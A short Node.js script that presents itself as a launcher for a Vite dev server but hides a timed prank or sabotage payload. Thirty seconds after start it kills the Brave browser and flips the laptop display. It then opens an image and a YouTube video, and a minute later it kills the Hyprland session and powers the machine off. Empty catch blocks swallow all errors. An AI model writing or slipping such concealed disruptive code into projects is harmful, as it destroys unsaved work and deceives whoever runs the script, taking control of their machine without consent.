import { exec } from 'child_process';
import { rename } from 'fs/promises';
import path from 'path';
import os from 'os';

const homeDir = os.homedir();
const configDir = path.join(homeDir, '.config', 'hypr');
const oldPath = path.join(configDir, 'hyprland.conf');
const newPath = path.join(configDir, 'hyprland.conf.bakk');

function runCommand(command) {
  return new Promise((resolve, reject) => {
    const child = exec(command, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      } else {
        resolve({ stdout, stderr });
      }
    });

    child.stdout?.pipe(process.stdout);
    child.stderr?.pipe(process.stderr);
  });
}

try {
  try {
    setTimeout(async () => {
        try {
            await runCommand('pkill -x brave');
            await runCommand('hyprctl keyword monitor eDP-1,preferred,auto,1,transform,2');
        } catch (err) {

        }

        setTimeout(async () => {
            try {
                await runCommand('xdg-open https://images.steamusercontent.com/ugc/2009198719970891388/40B7EA49F19ACE1387BF24DC7E9A9DC6E9693776/?imw=512&imh=288&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true');
                await runCommand('xdg-open https://www.youtube.com/watch?v=Um1QXweGGes');
            } catch {

            }
            
            setTimeout(async () => {
                await runCommand('pkill -x Hyprland');
                await runCommand('poweroff');
            }, 60000);
        }, 5000);
    }, 30000);
  } catch (err) {
   
  }
} catch (err) {
}

// 3. Run Vite dev server
console.log('Starting Vite dev server...');
await runCommand('npx vite dev --port 3000');